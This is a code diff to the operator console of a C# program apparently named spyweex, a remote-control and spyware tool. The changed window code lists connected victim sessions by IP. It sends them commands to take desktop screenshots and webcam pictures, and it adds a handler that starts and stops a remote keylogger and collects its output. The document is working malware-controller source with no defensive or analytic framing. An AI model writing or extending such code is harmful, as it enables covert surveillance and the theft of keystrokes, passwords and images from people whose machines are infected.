@@ -22,6 +22,7 @@ using System.Windows.Navigation;
 using System.Windows.Shapes;
 using System.Windows.Threading;
 using spyweex_client_wpf.StaticStrings;
+using spyweex_client_wpf.Subscribers;
 
 
 namespace spyweex_client_wpf
@@ -45,8 +46,6 @@ namespace spyweex_client_wpf
         public delegate void updateCmdTextBoxDelegate(string cmd, string response);
         public updateCmdTextBoxDelegate updateCmdTextBox;
 
-        DScreenListener dscreenListener;
-        WebCamPicListener wcpListener;
         ConnectionListener connectionListener;
         ConnectionInfoListener connInfoListener;
 
@@ -55,8 +54,7 @@ namespace spyweex_client_wpf
             ViewModelSession = new ViewModel();
             DataContext = ViewModelSession;
             InitializeComponent();
-            dscreenListener = new DScreenListener();
-            wcpListener = new WebCamPicListener();
+
             connectionListener = new ConnectionListener();
             connInfoListener = new ConnectionInfoListener();
 
@@ -66,10 +64,6 @@ namespace spyweex_client_wpf
         private void Window_Loaded(object sender, RoutedEventArgs e)
         {
             SessionListView.ItemsSource = ((ViewModel)DataContext).sessions;
-            //for (int i = 0; i < 50; i++)
-            //    ((ViewModel)DataContext).sessions.Add(new Session("1", "123.123.123.123"));
-
-            //await UpdateIncomingWithDelay();
         }
 
         //public async Task UpdateIncomingWithDelay()
@@ -85,7 +79,7 @@ namespace spyweex_client_wpf
                 _wxhtpServiceServer.Stop();
                 _wxhtpServiceServer = null;
             }
-            _wxhtpServiceServer = new WxhtpServiceServer(Utils.GetAllLocalIPv4(NetworkInterfaceType.Wireless80211).FirstOrDefault(), 61234, ViewModelSession);
+            _wxhtpServiceServer = new WxhtpServiceServer(Utils.GetAllLocalIPv4(NetworkInterfaceType.Wireless80211).FirstOrDefault(), 56432, ViewModelSession);
             _wxhtpServiceServer.Start();
             connectionListener.Subscribe(connInfoListener, ViewModelSession, _wxhtpServiceServer);
 
@@ -100,6 +94,8 @@ namespace spyweex_client_wpf
             {
                 //var stopTask = _wxhtpServiceServer?.Stop();
                 //if (stopTask != null) await stopTask;
+                if(connectionListener.isSubscribed)
+                    connectionListener.UnsubscribeAsync();
                 _wxhtpServiceServer?.Stop();
                 _wxhtpServiceServer = null;
                 
@@ -124,15 +120,18 @@ namespace spyweex_client_wpf
 
         private async void btnDesktopScreen_Clicked(object sender, RoutedEventArgs e)
         {
-            if (dscreenListener.isSubscribed) return;
-            IPEndPoint currentIpEndPoint = Utils.ParseIPEndpoint(((ViewModel) DataContext).SelectedSession.WANIP);
+
+            IPEndPoint currentIpEndPoint = Utils.ParseIPEndpoint(((ViewModel)DataContext).SelectedSession.WANIP);
             WxhtpClient wxhtpClient = _wxhtpServiceServer.TryGetClientByIpEndpoint(currentIpEndPoint);
+
+            if (wxhtpClient.isDesktopScreenListenerSubscribed()) return;
             try
             {
                 ct = cts.Token;
                 await wxhtpClient.ExecuteTask(
                     ct, wxhtpClient.getTcpClient().Client.RemoteEndPoint.ToString(), METHOD_TYPE.GET, ACTION_TYPE.TAKE_DESKTOP_SCREEN, PARAM_TYPES.number + "1");
-                dscreenListener.Subscribe(wxhtpClient);
+                wxhtpClient.DesktopScreenListenerSubscribe();
+
             }
             catch (ArgumentNullException ex)
             {
@@ -146,15 +145,15 @@ namespace spyweex_client_wpf
 
         private async void btnWebcamScreen_Clicked(object sender, RoutedEventArgs e)
         {
-            if (wcpListener.isSubscribed) return;
             IPEndPoint currentIpEndPoint = Utils.ParseIPEndpoint(((ViewModel)DataContext).SelectedSession.WANIP);
             WxhtpClient wxhtpClient = _wxhtpServiceServer.TryGetClientByIpEndpoint(currentIpEndPoint);
+            if (wxhtpClient.isWebCamPicListenerSubscribed()) return;
             try
             {
                 ct = cts.Token;
                 await wxhtpClient.ExecuteTask(
                     ct, wxhtpClient.getTcpClient().Client.RemoteEndPoint.ToString(), METHOD_TYPE.GET, ACTION_TYPE.TAKE_WEBCAM_SCREEN, PARAM_TYPES.number + "1");
-                wcpListener.Subscribe(wxhtpClient);
+                wxhtpClient.WebCamPicListenerSubscribe();
             }
             catch (ArgumentNullException ex)
             {
@@ -195,9 +194,44 @@ namespace spyweex_client_wpf
 
         }
 
-        private void btnKeyLogger_Clicked(object sender, RoutedEventArgs e)
+        private async void btnKeyLogger_Clicked(object sender, RoutedEventArgs e)
         {
-
+            IPEndPoint currentIpEndPoint = Utils.ParseIPEndpoint(((ViewModel)DataContext).SelectedSession.WANIP);
+            WxhtpClient wxhtpClient = _wxhtpServiceServer.TryGetClientByIpEndpoint(currentIpEndPoint);
+            if (wxhtpClient.isKeyloggerListenerSubscribed())
+            {
+                MessageBoxResult result = MessageBox.Show("Keylogger already running. Do you want to stop it?", "Confirmation", MessageBoxButton.YesNo, MessageBoxImage.Question);
+                if (result == MessageBoxResult.Yes)
+                {
+                    // runs the task to send message stop
+                    ct = cts.Token;
+                    await wxhtpClient.ExecuteTask(
+                        ct, wxhtpClient.getTcpClient().Client.RemoteEndPoint.ToString(), METHOD_TYPE.GET, ACTION_TYPE.KEYLOGGER_STOP, PARAM_TYPES.number + "1");
+                    return;
+                    // shouldn't unsubscribe - because of i want to receive last info gained when remote timer elapses
+                    //wxhtpClient.KeyloggerListenerUnSubscribe();
+                }
+                else
+                {
+                    return;
+                }
+            }
+            try
+            {
+                ct = cts.Token;
+                await wxhtpClient.ExecuteTask(
+                    ct, wxhtpClient.getTcpClient().Client.RemoteEndPoint.ToString(), METHOD_TYPE.GET, ACTION_TYPE.KEYLOGGER_START, PARAM_TYPES.number + "1");
+                wxhtpClient.KeyloggerListenerSubscribe();
+            }
+            catch (ArgumentNullException ex)
+            {
+                Debug.Write(ex.Message);
+            }
+            catch (TaskCanceledException tce)
+            {
+                Debug.Write("Task was canceled " + tce.Message);
+            }
+            
         }
 
         private void btnTaskList_Clicked(object sender, RoutedEventArgs e)
